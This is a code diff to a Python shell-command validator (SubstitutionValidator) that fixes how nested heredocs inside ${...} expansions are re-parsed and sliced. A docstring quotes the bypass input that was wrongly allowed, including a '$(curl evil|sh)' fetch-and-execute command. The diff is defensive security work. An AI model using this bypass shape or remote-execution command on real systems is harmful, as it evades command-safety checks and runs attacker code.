@@ -893,7 +893,7 @@ class SubstitutionValidator:
                 return
 
             if node.kind == "parameter":
-                substitutions.extend(self._substitutions_in_parameter(node, current_depth, command, budget))
+                substitutions.extend(self._substitutions_in_parameter(node, current_depth, budget))
                 return
 
             if node.kind == "redirect":
@@ -923,9 +923,7 @@ class SubstitutionValidator:
 
         return substitutions
 
-    def _substitutions_in_parameter(
-        self, node: Any, depth: int, command: str | None = None, budget: list[int] | None = None
-    ) -> list[SubstitutionNode]:
+    def _substitutions_in_parameter(self, node: Any, depth: int, budget: list[int] | None = None) -> list[SubstitutionNode]:
         """Extract substitutions written inside a ``${…}`` expansion body.
 
         SECURITY (LAB-1731): bashlex's ``parameter`` node is CHILDLESS, so a ``$( )``,
@@ -939,9 +937,15 @@ class SubstitutionValidator:
         judge it the same way they judge a bare ``$( )``. That keeps ``${z:-$(date)}`` allowed
         instead of blanket-denying every expansion containing a ``$``.
 
-        Node positions in the returned subtree are relative to the expansion body, not to the
-        outer command. Nothing on the validation path reads them — in particular do NOT wire
-        ``_find_outer_command`` (whose own docstring invites exactly that) into this path.
+        Node positions in the returned subtree are relative to the re-parsed text, not to the
+        outer command -- so the re-parsed text is what is threaded down as ``command``. One
+        thing reads it: ``_substitutions_in_heredoc`` slices ``command`` by node position to
+        read a body faithfully. Handed the OUTER command instead, a heredoc nested in this
+        body was sliced from the wrong string, saw no introducer, and returned nothing --
+        while the whitelisted ``$(date)`` decoded beside it kept the fail-closed fallback
+        from firing. ``echo "${x:-$(date) cat <<IN`` / ``$(curl evil|sh)`` / ``IN }"`` was
+        ALLOWED/SAFE while bash ran it. Still do NOT wire ``_find_outer_command`` (whose own
+        docstring invites exactly that) into this path.
 
         THE RE-PARSE IS THE DANGEROUS PART, because the body's real lexical context is inside
         ``${…}`` but bashlex is handed a command line. Two consequences, both found by the
@@ -980,12 +984,13 @@ class SubstitutionValidator:
             return []
 
         if depth < MAX_SUBSTITUTION_DEPTH:
+            source = value.replace("#", "_")
             try:
-                inner_ast = self.parser.parse(value.replace("#", "_"))
+                inner_ast = self.parser.parse(source)
             except Exception as exc:  # noqa: BLE001 - any decode failure is treated as suspicious
                 logger.debug("Unparseable parameter expansion body %r: %s", value, exc)
             else:
-                decoded = self.extract_substitutions(inner_ast, depth + 1, command, budget)
+                decoded = self.extract_substitutions(inner_ast, depth + 1, source, budget)
                 if decoded:
                     return decoded
 
@@ -1048,8 +1053,11 @@ class SubstitutionValidator:
         recovery -- still denies.
 
         Node positions in the returned subtree are relative to the wrapper, not to the outer
-        command. Nothing on the validation path reads them; do NOT wire
-        ``_find_outer_command`` into this path.
+        command -- so the wrapper is what is threaded down as ``command``, because a heredoc
+        nested inside this body slices ``command`` by those positions (the paragraph on
+        reading the body from the source, one level down). Handed the outer command it read
+        a shifted slice of the wrong string. Do NOT wire ``_find_outer_command`` into this
+        path.
 
         Cost: a substring scan for a body carrying no introducer, which is every everyday
         shape -- config files, commit bodies, plain text. A body that does carry one
@@ -1080,12 +1088,13 @@ class SubstitutionValidator:
             budget = [_MAX_HEREDOC_REPARSES]
         if source is not None and depth < MAX_SUBSTITUTION_DEPTH and budget[0] > 0:
             budget[0] -= 1
+            wrapper = f'echo "{_as_double_quoted(body)}"'
             try:
-                inner_ast = self.parser.parse(f'echo "{_as_double_quoted(body)}"')
+                inner_ast = self.parser.parse(wrapper)
             except Exception as exc:  # noqa: BLE001 - any decode failure is treated as suspicious
                 logger.debug("Unparseable heredoc body %r: %s", body, exc)
             else:
-                return self.extract_substitutions(inner_ast, depth + 1, command, budget)
+                return self.extract_substitutions(inner_ast, depth + 1, wrapper, budget)
 
         return [
             SubstitutionNode(
